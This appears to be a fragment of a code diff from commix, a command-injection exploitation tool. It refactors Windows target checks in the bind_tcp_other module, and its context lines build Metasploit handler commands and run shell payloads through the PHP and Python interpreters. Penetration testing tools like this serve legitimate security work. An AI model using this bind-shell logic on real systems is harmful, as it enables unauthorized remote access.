@@ -284,7 +284,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
                           "set lport "+ str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
-        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
+        if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
           set_php_working_dir()
           other_shell = settings.WIN_PHP_DIR + " -r " + data
         else:
@@ -375,7 +375,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
                           "set lport "+ str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
-        if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PHP_DIR:
+        if settings.TARGET_OS == settings.OS.WINDOWS and not settings.USER_DEFINED_PHP_DIR:
           set_php_working_dir()
           other_shell = settings.WIN_PHP_DIR + " -r " + data
         else:
@@ -420,7 +420,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + 
                           "set lport "+ str(settings.LPORT) + "\n"
                           "exploit\n\n")
 
-        if settings.TARGET_OS == "win":
+        if settings.TARGET_OS == settings.OS.WINDOWS:
           if not settings.USER_DEFINED_PYTHON_DIR: 
             set_python_working_dir()
           other_shell = settings.WIN_PYTHON_INTERPRETER + " -c " + "\"" + data + "\"" 
